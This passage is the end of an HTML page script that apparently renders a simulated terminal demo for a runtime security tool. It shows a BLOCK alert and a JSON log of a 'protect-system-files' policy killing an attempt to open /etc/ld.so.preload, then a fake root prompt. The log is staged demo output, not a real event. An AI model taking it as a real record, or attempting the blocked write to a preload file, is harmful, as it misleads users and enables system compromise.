            termContent.innerHTML += `
                <div style="margin-top: 8px; margin-bottom: 8px;">
                    <span class="alert-text">BLOCK</span> 
                    <span style="color: #FF5F56;">${killText}</span>
                </div>
                <div class="output-text" style="color: #888;">JSON Log: {"policy": "protect-system-files", "action": "sigkill", "syscall": "openat", "file": "/etc/ld.so.preload"}</div>
            `;

            // Final Prompt
            termContent.innerHTML += `<div><span class="prompt">root@prod-db:~#</span> <span class="cursor"></span></div>`;
            termContent.scrollTop = termContent.scrollHeight;
        }
    </script>
</body>
</html>